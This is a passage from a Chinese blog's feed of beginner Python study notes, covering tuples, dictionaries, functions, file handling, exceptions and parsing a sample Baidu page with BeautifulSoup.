<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tup1&#x3D;(12,34,56)</span><br><span class="line">tup2&#x3D;(&quot;abc&quot;,&quot;xyz&quot;)</span><br><span class="line">tup&#x3D;tup1+tup2</span><br><span class="line">print(tup) #输出(12, 34, 56, &#39;abc&#39;, &#39;xyz&#39;)</span><br></pre></td></tr></table></figure>

<p>删：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tup1&#x3D;(12,34,56)</span><br><span class="line">print(tup1)</span><br><span class="line">del tup1 #删除元组变量</span><br></pre></td></tr></table></figure>

<p>改：元组元素不可变所以不可改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tup1&#x3D;(12,34,56)</span><br><span class="line">tup1[0]&#x3D;100 #报错，不允许修改</span><br></pre></td></tr></table></figure>

<p>查：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tup1&#x3D;(&quot;abc&quot;,&quot;def&quot;,2020,2020)</span><br><span class="line">print(tup1[0]) #下标访问</span><br><span class="line">print(tup1[-1])</span><br><span class="line">print(tup1[1:5]) #可以切片</span><br><span class="line"></span><br><span class="line">tup&#x3D;(1,2,3)</span><br><span class="line">if 1 in tup:</span><br><span class="line">    print(&quot;exist&quot;)</span><br><span class="line">print(tup.count(1))</span><br></pre></td></tr></table></figure>

<h2 id="字典dict"><a href="#字典dict" class="headerlink" title="字典dict"></a>字典dict</h2><p>用花括号<code>{}</code>表示，存储键值对，查找速度快，键必须使用不可变类型，同一个字典键必须唯一</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info&#x3D;&#123;&quot;name&quot;:&quot;吴彦祖&quot;,&quot;age&quot;:18&#125;</span><br><span class="line">下标访问</span><br><span class="line">print(info[&quot;name&quot;])</span><br><span class="line">print(info[&quot;age&quot;])</span><br><span class="line">访问了不存在的键</span><br><span class="line">print(info[&quot;gender&quot;]) #直接访问会报错</span><br><span class="line">print(info.get(&quot;gender&quot;)) #使用get方法没有找到对应的键，默认返回None</span><br><span class="line">print(info.get(&quot;age&quot;,&quot;False&quot;)) #没找到可以设定指定返回值</span><br></pre></td></tr></table></figure>

<p>增删改查：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info&#x3D;&#123;&quot;name&quot;:&quot;吴彦祖&quot;,&quot;age&quot;:18&#125;</span><br><span class="line">增</span><br><span class="line">info[&quot;id&quot;]&#x3D;12</span><br><span class="line">删</span><br><span class="line">del info[&quot;name&quot;] #删除键值对</span><br><span class="line">del info #删除字典变量</span><br><span class="line">info.clear() #清空字典变量</span><br><span class="line">改</span><br><span class="line">info[&quot;age&quot;]&#x3D;20</span><br><span class="line">查</span><br><span class="line">print(info.keys()) #得到所有的键(列表)</span><br><span class="line">print(info.values()) #得到所有的值(列表)</span><br><span class="line">print(info.items()) #得到所有的项(列表里嵌套元组)</span><br></pre></td></tr></table></figure>

<p>遍历：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#遍历所有的键</span><br><span class="line">for key in info: #或者for key in info.keys()</span><br><span class="line">    print(key)</span><br><span class="line">#遍历所有的值</span><br><span class="line">for value in info.values():</span><br><span class="line">    print(value)</span><br><span class="line">#遍历所有键值对</span><br><span class="line">for key,value in info.items():</span><br><span class="line">    print(&quot;key:&#123;&#125;,value:&#123;&#125;&quot;.format(key,value))</span><br><span class="line"></span><br><span class="line">mylist&#x3D;[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;]</span><br><span class="line">for i,x in enumerate(mylist): #枚举函数，使for循环也能操作列表下标</span><br><span class="line">    print(i,x)</span><br></pre></td></tr></table></figure>

<h2 id="集合set"><a href="#集合set" class="headerlink" title="集合set"></a>集合set</h2><p>集合和字典类似，用{}表示，没有重复元素<br>set是无序的，重复元素会被自动过滤。很有用的就是可用于数据去重<br>set相当于数学意义上的无序无重复元素的集合，可以做集合操作（交并差等）<br>增删改查等等。。这里视频没讲，应该不是很重要，以后遇到在查吧。</p>
<h2 id="数据结构重点"><a href="#数据结构重点" class="headerlink" title="数据结构重点"></a>数据结构重点</h2><p>重点掌握列表和字典，尤其是字典，用的最多。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>把使用率高的代码封装成函数，提高编程效率和实现代码重用，便于模块化开发</p>
<p>语法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#定义:</span><br><span class="line">def 函数名():</span><br><span class="line">    代码</span><br><span class="line">#调用:</span><br><span class="line">函数名()</span><br></pre></td></tr></table></figure>

<p>python函数，参数、全局变量、局部变量、作用域和其他语言差不多</p>
<p>不同的是，python可以没有返回值，也可以返回多个值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def printinfo():</span><br><span class="line">    print(&quot;-----------------&quot;)</span><br><span class="line">    print(&quot;人生苦短 我用Python&quot;)</span><br><span class="line">    print(&quot;-----------------&quot;)</span><br><span class="line">printinfo()</span><br><span class="line">def divide(a,b):</span><br><span class="line">    shang&#x3D;a&#x2F;&#x2F;b #&#x2F;&#x2F;取整除,向下取接近商的整数</span><br><span class="line">    yushu&#x3D;a%b</span><br><span class="line">    return shang,yushu</span><br><span class="line">sh,yu&#x3D;divide(5,2)</span><br><span class="line">print(sh)</span><br><span class="line">print(yu)</span><br></pre></td></tr></table></figure>

<p>global可以让全局变量在函数中使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;200 #函数外定义的为全局变量</span><br><span class="line">def test1():</span><br><span class="line">    global a #声明全局变量在函数中的标识符</span><br><span class="line">    a&#x3D;300 #函数内定义的为局部变量,默认局部变量优先。</span><br><span class="line">    print(&quot;test1--------修改前：a&#x3D;&#123;&#125;&quot;.format(a))</span><br><span class="line">    a&#x3D;100</span><br><span class="line">    print(&quot;test1--------修改后：a&#x3D;&#123;&#125;&quot;.format(a))</span><br><span class="line">test1()</span><br></pre></td></tr></table></figure>

<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>打开、关闭、读取、写入</p>
<p>打开文件语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open(name[,mode])</span><br></pre></td></tr></table></figure>

<p>常用模式：<br><code>r</code>以只读方式打开文件,没找到会报错 默认是<code>r</code>模式<br><code>w</code>打开一个文件只用于写入,文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。<br><code>rb</code> 以二进制格式打开文件用于只读…<br><code>wb</code> 以二进制格式打开文件只用于写入…</p>
<p>关闭文件：</p>
<p>如果用<code>open</code>打开文件一定要用<code>close</code>方法关闭文件，不然后面可能会有问题，用<code>with open</code>打开文件不用<code>close</code>，它会自动关闭，所以最好用<code>with open</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f&#x3D;open(&quot;123.txt&quot;)</span><br><span class="line">f.close()</span><br><span class="line">#下面的写法不用关闭</span><br><span class="line">with open(&quot;123.txt&quot;) as f:</span><br><span class="line">	代码</span><br></pre></td></tr></table></figure>

<p>读取文件：</p>
<p>.read([size])方法，读取文件内容，size不指定则返回整个文件。有size则，开始时文件指针定位在头部，每执行一次文件指针移动size个位置，返回的是字符串</p>
<p>.readlines([size])方法返回size行的列表，未指定则返回全部行的列表</p>
<p>.readline()方法返回一行字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&quot;test.txt&quot;) as f:</span><br><span class="line">    content&#x3D;f.read(5) #前5个字符串</span><br><span class="line">    content&#x3D;f.read(5) #之后5个字符串</span><br><span class="line"></span><br><span class="line">with open(&quot;test.txt&quot;) as f:</span><br><span class="line">    content&#x3D;f.readlines() #.readlines([size])方法返回size行的列表，未指定则返回全部行的列表</span><br><span class="line">    i&#x3D;1</span><br><span class="line">    for tem in content:</span><br><span class="line">        print(&quot;第&#123;&#125;行：&#123;&#125;&quot;.format(i,tem))</span><br><span class="line">        i+&#x3D;1</span><br><span class="line">    print(content)</span><br><span class="line"></span><br><span class="line">with open(&quot;test.txt&quot;) as f:</span><br><span class="line">    content&#x3D;f.readline() #返回一行字符串</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>

<p>写入文件：</p>
<p><code>write()</code>方法，将字符串写入文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&quot;test.txt&quot;) as f:</span><br><span class="line">	f.write(&quot;hello world&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>OS模块有很多操作文件的函数，比如删除、重命名、创建文件夹、获取当前目录等等</p>
<p>等以后遇到了再看看</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记4</title>
    <url>/2021/04/21/Python4/</url>
    <content><![CDATA[<p>错误和异常<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>即便 Python 程序的语法是正确的，在运行它的时候，也有可能发生错误。运行期检测到的错误被称为异常。</p>
<p>四个关键词：<code>try</code>、<code>except</code>、<code>else</code>、<code>finally</code></p>
<p>用<code>try/except</code>就可以异常捕获,用try包含可能发生问题的代码段，except处理异常</p>
<p>一个 try 语句可能包含多个except子句，分别来处理不同的特定的异常。最多只有一个分支会被执行。</p>
<p>一个except子句可以同时处理多个异常，这些异常将被放在一个括号里</p>
<p>如果没有发生异常则执行else代码块</p>
<p>无论是否发生异常都会执行finally代码块</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>except后面指定错误类型，只有指定错误类型的错误发生了，才执行except代码块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&quot;------test------1&quot;)</span><br><span class="line">    with open(&quot;123.txt&quot;) as f:</span><br><span class="line">        print(&quot;------test------2&quot;)</span><br><span class="line">except IOError: #文件没找到属于IO异常</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(num)</span><br><span class="line">except NameError: #异常类型想要被捕获，需要一致</span><br><span class="line">    print(&quot;产生错误了&quot;)</span><br></pre></td></tr></table></figure>

<p>一个except可以用括号捕获多个错误类型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&quot;------test------1&quot;)</span><br><span class="line">    with open(&quot;123.txt&quot;) as f:</span><br><span class="line">        print(&quot;------test------2&quot;)</span><br><span class="line">    print(num)</span><br><span class="line">except (NameError,IOError): #可以将多个异常类型放在括号里</span><br><span class="line">    print(&quot;产生错误了&quot;)</span><br></pre></td></tr></table></figure>

<p>用<code>as</code>输出错误描述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&quot;------test------1&quot;)</span><br><span class="line">    with open(&quot;123.txt&quot;) as f:</span><br><span class="line">        print(&quot;------test------2&quot;)</span><br><span class="line">    print(num)</span><br><span class="line">except (NameError,IOError) as err:</span><br><span class="line">    print(&quot;产生错误了&quot;)</span><br><span class="line">    print(err)</span><br></pre></td></tr></table></figure>

<p><code>Exception</code>是所有异常的父类，可以捕获所有异常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&quot;------test------1&quot;)</span><br><span class="line">    with open(&quot;123.txt&quot;) as f:</span><br><span class="line">        print(&quot;------test------2&quot;)</span><br><span class="line">    print(num)</span><br><span class="line">except Exception as err: #Exception是所有异常的父类可以承接所有异常</span><br><span class="line">    print(&quot;产生错误了&quot;)</span><br><span class="line">    print(err)</span><br></pre></td></tr></table></figure>

<p>如果不需要错误描述，就用<code>except</code>就可以了，它相当于一个通配符也可以捕获所有异常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&quot;------test------1&quot;)</span><br><span class="line">    with open(&quot;123.txt&quot;) as f:</span><br><span class="line">        print(&quot;------test------2&quot;)</span><br><span class="line">    print(num)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;产生错误了&quot;)</span><br></pre></td></tr></table></figure>

<p>try也可以嵌套写，套在try或者else里：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    try:</span><br><span class="line">        with open(&quot;123.txt&quot;) as f:</span><br><span class="line">            print(f.readlines())</span><br><span class="line">    finally:</span><br><span class="line">        print(&quot;文件异常&quot;)</span><br><span class="line">except Exception as err:</span><br><span class="line">    print(&quot;发生异常&quot;)</span><br><span class="line">finally:</span><br><span class="line">    print(&quot;程序执行完毕&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h2><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421142535413.png" alt="image-20210421142535413"></p>
<p>这里我把古诗写到poetry文件里了，因为gushi这名字不太优雅，我也没写函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    with open(&quot;poetry.txt&quot;,&quot;w&quot;) as f:</span><br><span class="line">        poem&#x3D;&#39;&#39;&#39;曾经沧海难为水，除却巫山不是云。</span><br><span class="line">取次花丛懒回顾，半缘修道半缘君。&#39;&#39;&#39;</span><br><span class="line">        f.write(poem)</span><br><span class="line">except Exception as err:</span><br><span class="line">    print(err)</span><br><span class="line">try:</span><br><span class="line">    with open(&quot;copy.txt&quot;,&quot;w&quot;) as f:</span><br><span class="line">        with open(&quot;poetry.txt&quot;,&quot;r&quot;) as ff:</span><br><span class="line">            f.write(ff.readline())</span><br><span class="line">            f.write(ff.readline())</span><br><span class="line">except Exception as err:</span><br><span class="line">    print(err)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;复制完毕&quot;)</span><br></pre></td></tr></table></figure>

<p>遇到一点小问题就是中文乱码，在Pycharm里设置一下编码就好了：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421142823074.png" alt="image-20210421142823074"></p>
<p>这三个地方改一下就不乱码了</p>
<h2 id="Python编程规范"><a href="#Python编程规范" class="headerlink" title="Python编程规范"></a>Python编程规范</h2><p>1.Python程序第一行加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">#或者:</span><br><span class="line">#coding&#x3D;utf-8</span><br></pre></td></tr></table></figure>

<p>这样可以在代码中包含中文</p>
<p>2.使用函数实现单一功能，提高可读性、开发效率和代码重复利用率，方便模块化开发</p>
<p>3.Python程序加入<code>main</code>函数用于测试程序，或者说是主程序入口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br></pre></td></tr></table></figure>

<p><code>if __name__==&quot;__main__&quot;:</code>里的代码块不会被<code>import</code>导入</p>
<p>所以当py文件被直接运行时，<code>if __name__==&quot;__main__&quot;:</code>里的代码块会被执行；当py文件以模块形式被导入时，<code>if __name__==&quot;__main__&quot;:</code>里的代码块不会执行。当模块不是主程序运行时，它就不会运行，只是变成了方法供调用</p>
<p>在前面写一些函数，然后在<code>if __name__==&quot;__main__&quot;:</code>里面调用，方便我们查看，或者说方便我们控制多个函数之间的关系和流程，更清楚的管理代码的主流程</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=16" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=16</a></p>
<p><a href="https://blog.csdn.net/yjk13703623757/article/details/77918633" target="_blank" rel="noopener">https://blog.csdn.net/yjk13703623757/article/details/77918633</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Python学习笔记5-BeautifulSoup模块</title>
    <url>/2021/04/29/Python5/</url>
    <content><![CDATA[<p>前几天因为英语期中考，想考好点所以花了大量时间看学术英语，考完可以继续学习爬虫了。前面学了Python的基本语法以及requests库，现在学一下BeautifulSoup库。<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>BeautifulSoup将复杂的HTML文档转换成一个复杂的树形结构，每个节点都是Python对象，所有对象可以归纳为4种：</p>
<p>以百度网页为例子学习：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot; http-equiv&#x3D;&quot;content-type&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta content&#x3D;&quot;IE&#x3D;Edge&quot; http-equiv&#x3D;&quot;X-UA-Compatible&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta content&#x3D;&quot;always&quot; name&#x3D;&quot;referrer&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;ss1.bdstatic.com&#x2F;5eN1bjq8AAUYm2zgoY3K&#x2F;r&#x2F;www&#x2F;cache&#x2F;bdorz&#x2F;baidu.min.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;百度一下，你就知道 &lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body link&#x3D;&quot;#0000cc&quot;&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;head&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;head_wrapper&quot;&gt;</span><br><span class="line">          &lt;div id&#x3D;&quot;u1&quot;&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;http:&#x2F;&#x2F;news.baidu.com&quot; name&#x3D;&quot;tj_trnews&quot;&gt;&lt;!--新闻--&gt;&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;http:&#x2F;&#x2F;news.baidu.com&quot; name&#x3D;&quot;tj_trnews&quot;&gt;新闻&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;https:&#x2F;&#x2F;www.hao123.com&quot; name&#x3D;&quot;tj_trhao123&quot;&gt;hao123&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;http:&#x2F;&#x2F;map.baidu.com&quot; name&#x3D;&quot;tj_trmap&quot;&gt;地图&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;http:&#x2F;&#x2F;v.baidu.com&quot; name&#x3D;&quot;tj_trvideo&quot;&gt;视频&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;mnav&quot; href&#x3D;&quot;http:&#x2F;&#x2F;tieba.baidu.com&quot; name&#x3D;&quot;tj_trtieba&quot;&gt;贴吧&lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a class&#x3D;&quot;bri&quot; href&#x3D;&quot;&#x2F;&#x2F;www.baidu.com&#x2F;more&#x2F;&quot; name&#x3D;&quot;tj_briicon&quot; style&#x3D;&quot;display: block;&quot;&gt;更多产品 &lt;&#x2F;a&gt;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>程序开头如下，因为这是简化版的百度页面代码，我从群里下到本地的所以不用<code>requests</code>获取数据了，直接用<code>with open</code>打开，然后用<code>html.parser</code>解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">with open(&quot;baidu.html&quot;,&quot;rb&quot;) as f:</span><br><span class="line">    html&#x3D;f.read()</span><br><span class="line">    bs&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">    #下面代码都在这个基础上执行</span><br></pre></td></tr></table></figure>

<p>Tag</p>
<p>标签及其内容，拿到它找到的第一个标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 1.Tag 标签及其内容：拿到它找到的第一个内容</span><br><span class="line">print(bs.title) # 获得首个title标签及其内容,下同</span><br><span class="line">print(bs.a)</span><br><span class="line">print(bs.head)</span><br><span class="line">print(type(bs.a)) # &lt;class &#39;bs4.element.Tag&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>NavigableString</p>
<p>标签里的内容(字符串)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(bs.title.text) # 或者.string</span><br><span class="line">print(bs.a.attrs) # .attra获取所有属性的字典</span><br><span class="line">print(bs.a.name) # .name获取标签的名字,得到的是字符串类型</span><br><span class="line">print(type(bs.title.string)) # &lt;class &#39;bs4.element.NavigableString&#39;&gt;</span><br></pre></td></tr></table></figure>

<p>BeautifulSoup</p>
<p>表示整个文档：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(bs.name) # [document]</span><br><span class="line">print(bs.attrs) # &#123;&#125;</span><br><span class="line">print(bs) #整个文档树</span><br></pre></td></tr></table></figure>

<p>Comment</p>
<p>它是一个特殊的NavigableString，输出的内容不包含注释符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(bs.a.string)</span><br><span class="line">print(type(bs.a.string))</span><br></pre></td></tr></table></figure>

<h2 id="文档的遍历"><a href="#文档的遍历" class="headerlink" title="文档的遍历"></a>文档的遍历</h2><p><code>.contents</code>属性获得子节点的列表，将所有儿子节点存入列表。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(bs.head.contents)</span><br><span class="line">print(bs.head.contents[1])</span><br><span class="line">#更多内容，搜索BeautifulSoup文档树</span><br></pre></td></tr></table></figure>

<p>网上看了下，文档遍历有上行遍历、下行遍历和平行遍历，<code>.contents</code>属于下行遍历，还有很多属性没有学，可能是没必要或者用的不多，视频没怎么讲，等以后碰到问题再看吧。</p>
<h2 id="文档的搜索"><a href="#文档的搜索" class="headerlink" title="文档的搜索"></a>文档的搜索</h2><p>看到弹幕说用xpath，这个以后有时间可以去了解一下</p>
<h3 id="find-all"><a href="#find-all" class="headerlink" title="find_all()"></a>find_all()</h3><p><code>find_all()</code>方法返回列表</p>
<h4 id="字符串搜索"><a href="#字符串搜索" class="headerlink" title="字符串搜索"></a>字符串搜索</h4><p>查找与字符串完全匹配的标签：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.find_all(&quot;a&quot;)</span><br></pre></td></tr></table></figure>

<p>这样就可以得到包含有所a标签的列表</p>
<h4 id="正则表达式搜索"><a href="#正则表达式搜索" class="headerlink" title="正则表达式搜索"></a>正则表达式搜索</h4><p>正则是用<code>re</code>模块的<code>search()</code>方法来匹配内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.find_all(re.compile(&quot;a&quot;))</span><br></pre></td></tr></table></figure>

<h4 id="方法搜索"><a href="#方法搜索" class="headerlink" title="方法搜索"></a>方法搜索</h4><p>传入一个函数(方法)，根据函数的要求来搜索(了解就行了)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def name_is_exist(tag):</span><br><span class="line">	return tag.has_attr(&quot;name&quot;) #返回有name属性的标签</span><br><span class="line">t_list&#x3D;bs.find_all(name_is_exist)</span><br><span class="line">for item in t_list:</span><br><span class="line">	print(item)</span><br></pre></td></tr></table></figure>

<h4 id="kwargs参数"><a href="#kwargs参数" class="headerlink" title="kwargs参数"></a>kwargs参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.find_all(id&#x3D;&quot;head&quot;) #查找属性id&#x3D;&quot;head&quot;的标签</span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br><span class="line">    </span><br><span class="line">t_list&#x3D;bs.find_all(class_&#x3D;True) #class是关键字，加_区分，表示有class属性的标签</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br></pre></td></tr></table></figure>

<h4 id="text参数"><a href="#text参数" class="headerlink" title="text参数"></a>text参数</h4><p>文本参数，搜索标签文本，就是&lt;..&gt;和&lt;/&gt;之间的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.find_all(text&#x3D;&quot;hao123&quot;)</span><br><span class="line">t_list&#x3D;bs.find_all(text&#x3D;[&quot;hao123&quot;,&quot;地图&quot;,&quot;贴吧&quot;])</span><br><span class="line">t_list&#x3D;bs.find_all(text&#x3D;re.compile(&quot;\d&quot;)) #用正则表达式来查找包含特定文本的内容(标签里的字符串)</span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>

<h4 id="limit参数"><a href="#limit参数" class="headerlink" title="limit参数"></a>limit参数</h4><p>限定获取数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.find_all(&quot;a&quot;,limit&#x3D;3)</span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>

<h3 id="select"><a href="#select" class="headerlink" title="select()"></a>select()</h3><p><code>select()</code>是css选择器，返回列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">t_list&#x3D;bs.select(&quot;title&quot;) #元素选择器</span><br><span class="line">t_list&#x3D;bs.select(&quot;.mnav&quot;) #类选择器</span><br><span class="line">t_list &#x3D; bs.select(&quot;#u1&quot;) #id选择器</span><br><span class="line">t_list&#x3D;bs.select(&quot;a[class&#x3D;&#39;bri&#39;]&quot;) #属性选择器</span><br><span class="line">t_list&#x3D;bs.select(&quot;head&gt;title&quot;) #子元素选择器</span><br><span class="line">t_list&#x3D;bs.select(&quot;.mnav~.bri&quot;) #普通兄弟选择器</span><br><span class="line">print(t_list[0].get_text()) #get_text()方法获取标签文本</span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>

<p>之前学过css，看起来感觉差不多</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我感觉find_all那里没有学的很清楚，第二个参考文章里面写的挺清楚的，我以后要多看看。</p>
<p>最后附上完整的笔记：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding&#x3D;utf-8-*-</span><br><span class="line"># @Time     : 2021&#x2F;4&#x2F;22 8:15</span><br><span class="line"># @Auther   : Tianze</span><br><span class="line"># @Email    : 1252448508@qq.com</span><br><span class="line"># @File     : demo8.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line"></span><br><span class="line">#BeautifulSuop4将复杂HTML文档转换成一个复杂的树形结构，每个节点都是Python对象，所有对象可以归纳为4种：</span><br><span class="line">#Tag</span><br><span class="line">#NavigableString</span><br><span class="line">#BeautifulSuop</span><br><span class="line">#Comment</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">with open(&quot;baidu.html&quot;,&quot;rb&quot;) as f:</span><br><span class="line">    html&#x3D;f.read()</span><br><span class="line">    bs&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line"></span><br><span class="line">    # 1.Tag 标签及其内容：拿到它找到的第一个内容</span><br><span class="line">    print(bs.title) #获得首个标签及其内容</span><br><span class="line">    print(bs.a)</span><br><span class="line">    print(bs.head)</span><br><span class="line">    print(type(bs.a))</span><br><span class="line"></span><br><span class="line">    #2.NavigableString 标签里的内容(字符串)</span><br><span class="line">    print(bs.title.text) #或者.string</span><br><span class="line">    print(bs.a.attrs) #.attra获取所有属性的字典</span><br><span class="line">    print(type(bs.title.string))</span><br><span class="line"></span><br><span class="line">    #3.BeautifulSoup  表示整个文档</span><br><span class="line">    print(bs.name)</span><br><span class="line">    print(bs.attrs)</span><br><span class="line">    print(bs)</span><br><span class="line"></span><br><span class="line">    #4.Comment 是一个特殊的NavigableSting  输出的内容不包含注释符</span><br><span class="line">    print(bs.a.string)</span><br><span class="line">    print(type(bs.a.string))</span><br><span class="line"></span><br><span class="line">    #文档的遍历</span><br><span class="line">    print(bs.head.contents)</span><br><span class="line">    print(bs.head.contents[1])</span><br><span class="line">    # 更多内容，搜索BeautifulSoup文档树</span><br><span class="line"></span><br><span class="line">    #文档的搜索   #弹幕说xpath</span><br><span class="line">    #1.find_all() #返回列表</span><br><span class="line"></span><br><span class="line">    #字符串过滤：查找与字符串完全匹配的内容</span><br><span class="line">    t_list&#x3D;bs.find_all(&quot;a&quot;)</span><br><span class="line"></span><br><span class="line">    #正则表达式搜索：使用search()方法来匹配内容</span><br><span class="line">    t_list&#x3D;bs.find_all(re.compile(&quot;a&quot;))</span><br><span class="line"></span><br><span class="line">    #方法搜索：传入一个函数（方法），根据函数的要求来搜索 (了解就行了）</span><br><span class="line">    def name_is_exist(tag):</span><br><span class="line">        return tag.has_attr(&quot;name&quot;)</span><br><span class="line">    t_list&#x3D;bs.find_all(name_is_exist)</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span class="line">    #kwargs参数</span><br><span class="line">    t_list&#x3D;bs.find_all(id&#x3D;&quot;head&quot;)</span><br><span class="line">    for item in t_list:</span><br><span class="line">        print(item)</span><br><span class="line"></span><br><span 